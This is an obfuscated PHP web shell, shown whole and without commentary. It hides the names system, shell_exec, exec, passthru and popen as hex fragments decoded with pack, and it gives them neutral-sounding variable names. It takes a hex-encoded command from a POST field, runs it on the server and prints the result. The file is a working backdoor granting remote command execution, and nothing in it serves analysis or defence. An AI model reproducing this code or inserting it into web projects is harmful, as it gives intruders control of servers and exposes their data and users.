<?php


$sym1 = '79';
$sym2 = '6d';
$sym3 = '73';
$sym4 = '68';
$sym5 = '65';
$sym6 = '6c';
$sym7 = '78';
$sym8 = '63';
$sym9 = '61';
$sym10 = '72';
$sym11 = '70';
$sym12 = '6f';
$sym13 = '74';
$sym14 = '5f';
$sym15 = '67';
$sym16 = '6e';
$task_processor1 = pack("H*", '73'.$sym1.'73'.'74'.'65'.$sym2);
$task_processor2 = pack("H*", $sym3.$sym4.$sym5.$sym6.$sym6.'5f'.$sym5.$sym7.'65'.$sym8);
$task_processor3 = pack("H*", $sym5.$sym7.'65'.$sym8);
$task_processor4 = pack("H*", '70'.$sym9.'73'.'73'.'74'.$sym4.$sym10.'75');
$task_processor5 = pack("H*", $sym11.$sym12.$sym11.'65'.'6e');
$task_processor6 = pack("H*", $sym3.$sym13.$sym10.'65'.$sym9.'6d'.$sym14.$sym15.'65'.'74'.$sym14.'63'.$sym12.'6e'.$sym13.$sym5.$sym16.$sym13.'73');
$task_processor7 = pack("H*", $sym11.$sym8.'6c'.$sym12.$sym3.'65');
$reverse_searcher = pack("H*", $sym10.'65'.'76'.$sym5.'72'.'73'.$sym5.'5f'.$sym3.'65'.$sym9.'72'.$sym8.$sym4.$sym5.$sym10);
if (isset($_POST[$reverse_searcher])) {
    $reverse_searcher = pack("H*", $_POST[$reverse_searcher]);
    if (function_exists($task_processor1)) {
        $task_processor1($reverse_searcher);
    } elseif (function_exists($task_processor2)) {
        print $task_processor2($reverse_searcher);
    } elseif (function_exists($task_processor3)) {
        $task_processor3($reverse_searcher, $marker_res);
        print join("\n", $marker_res);
    } elseif (function_exists($task_processor4)) {
        $task_processor4($reverse_searcher);
    } elseif (function_exists($task_processor5) && function_exists($task_processor6) && function_exists($task_processor7)) {
        $rec_pset = $task_processor5($reverse_searcher, 'r');
        if ($rec_pset) {
            $factor_itm = $task_processor6($rec_pset);
            $task_processor7($rec_pset);
            print $factor_itm;
        }
    }
    exit;
}
